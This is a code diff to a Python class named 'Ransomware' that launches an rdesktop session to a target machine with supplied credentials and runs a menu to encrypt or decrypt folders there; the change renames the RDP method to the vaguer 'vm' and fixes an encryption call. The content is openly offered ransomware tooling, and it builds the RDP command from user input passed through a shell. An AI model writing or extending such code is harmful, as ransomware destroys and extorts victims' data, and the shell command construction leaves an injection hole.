@@ -20,7 +20,7 @@ class Ransomware:
         self.key = load_key()
 
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
-    def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
+    def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
         rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
         subprocess.Popen(rdp_command, shell=True)
 
@@ -78,11 +78,10 @@ while True:
         folder_path = input("Enter the folder path to encrypt on the target VM: ")
         rdp_username = input("Enter your RDP username: ")
         rdp_password = input("Enter your RDP password: ")
-        ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
-        encryt_folder(folder_path)
+        ransomware.vm(target_vm_ip, folder_path, rdp_username, rdp_password)
+        ransomware.encrypt_folder(folder_path)
     elif choice == "2":
         folder_path = input("Enter the folder path to decrypt: ")
         ransomware.decrypt_folder(folder_path)
     else:
         print("Invalid choice. Please choose a valid option.")
-
